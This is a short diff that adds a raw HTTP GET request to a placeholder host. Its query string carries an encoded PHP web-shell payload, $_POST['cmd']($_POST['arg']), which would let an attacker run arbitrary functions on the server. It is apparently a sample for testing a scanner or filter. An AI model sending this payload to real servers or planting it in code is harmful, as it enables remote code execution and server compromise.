@@ -1,0 +1,4 @@
+GET /a?cmd=$_POST[%26%23x27;cmd%26%23x27;]($_POST[%26%23x27;arg%26%23x27;]); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
